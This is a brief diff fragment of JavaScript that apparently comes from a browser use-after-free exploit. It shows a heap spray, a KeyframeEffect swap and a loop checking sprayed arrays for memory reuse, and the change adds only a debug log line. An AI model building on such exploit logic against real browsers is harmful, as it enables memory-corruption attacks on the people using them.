@@ -63,7 +63,8 @@
               object.codeBase;
               animation.effect = new KeyframeEffect(dl, {});
               const spray = heapSpray();
-              // Check for UAF immediately after heap spray
+              debug_log("Heap spray completed");
+              // Check for UAF after heap spray
               debug_log("Checking for UAF memory reuse...");
               for (let i = 0; i < spray.length; i++) {
                 const arr = spray[i];
